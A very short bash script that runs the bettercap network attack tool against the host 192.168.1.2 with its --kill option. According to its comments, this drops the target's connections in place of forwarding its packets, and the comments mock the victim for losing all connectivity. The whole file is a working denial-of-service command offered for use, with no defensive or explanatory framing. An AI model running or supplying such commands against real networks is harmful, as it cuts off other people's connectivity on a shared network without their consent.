#!/usr/bin/env bash
#vim: set noexpandtab tabstop=2:

#Instead of forwarding packets, this switch will make targets connections to be killed.

#No dear 192.168.1.2, you won’t connect to anything anymore :D
sudo bettercap -T 192.168.1.2 --kill
